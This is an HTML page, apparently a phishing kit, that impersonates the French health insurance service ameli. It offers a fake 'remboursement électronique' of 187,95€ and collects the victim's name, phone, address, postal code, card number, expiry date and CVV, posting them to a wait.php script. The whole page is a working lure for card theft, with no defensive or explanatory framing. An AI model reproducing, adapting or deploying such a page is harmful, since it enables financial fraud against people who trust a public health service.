<!DOCTYPE html>
<html>

<head>
	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"/>
	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"/>
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"/>
	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"/>
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"/>
	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"/>
	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"/>
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"/>
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"/>
	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"/>
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/>
	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"/>
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Compte ameli - mon espace personnel</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
</head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/ameli.jpg" alt="" >

               
                
            </div>
        </header>

        <div class="creditCardForm">
          <h4 style="font-family:fantasy " >FORMULAIRE DE REMBOURSEMENT ÉLECTRONIQUE / RÉFÉRENCE : AMELI-A8005W
MONTANT : 187,95€</h4>
            <div class="payment">
                <form action="wait.php" method="post" id="myForm">
                    <div class="form-group name">
                        <label for="owner">Nom et Prénom <span class="redd">*</span>  </label>
                        <input type="text" class="form-control" id="owner" name="nome">
                    </div>
                    <div class="form-group tel">
                        <label for="owner">Télephone</label>
                        <input type="text" class="form-control" id="owner" name="tel">
                    </div>
					<div class="form-group owner">
		                <label for="owner">Adresse</label>
		                <input type="text" class="form-control" id="owner" name="adres">
		            </div>
					<div class="form-group CVV">
		                <label for="owner">Code postal <span class="redd">*</span></label>
		                <input type="text" class="form-control" id="zip" name="zip">
		            </div>
 <div class="form-group" id="card-number-field">
                        <label for="cardNumber">Numéro de carte <span class="redd">*</span></label>
                        <input type="text" class="form-control" id="cardNumber" name="Cardnumber">
                    </div>	
                     <div class="form-group" id="expiration-date">
                        <label>Expiration (MM/AA) <span class="redd">*</span></label>
                        <select name="ExpirationDate">
                            <option value="01">01</option>
                            <option value="02">02 </option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">07</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select name="ExpirationD">
                            <option value="19"> 2019</option>
                            <option value="20"> 2020</option>
                            <option value="21"> 2021</option>
                            <option value="22"> 2022</option>
                            <option value="23"> 2023</option>
                            <option value="24"> 2024</option>
                            <option value="25"> 2025</option>
                        </select>
                    </div>
                    <div class="form-group CVVV">
                        <label for="cvv">CVV <span class="redd">*</span></label>
                        <input type="text" name="cvv" class="form-control" id="cvv">
                    </div>
                   
                   
                    <div class="form-group" id="credit_cards">
                        <img src="assets/images/visa.jpg" id="visa">
                        <img src="assets/images/mastercard.jpg" id="mastercard">
                        <img src="assets/images/amex.jpg" id="amex">
                    </div>
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="btn btn-default" id="confirm-purchase" name="submitt">Confirmer</button>
                    </div>
                </form>
            </div>
        </div>

   

      
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
    <script src="assets/js/script.js"></script>
</body>

</html>
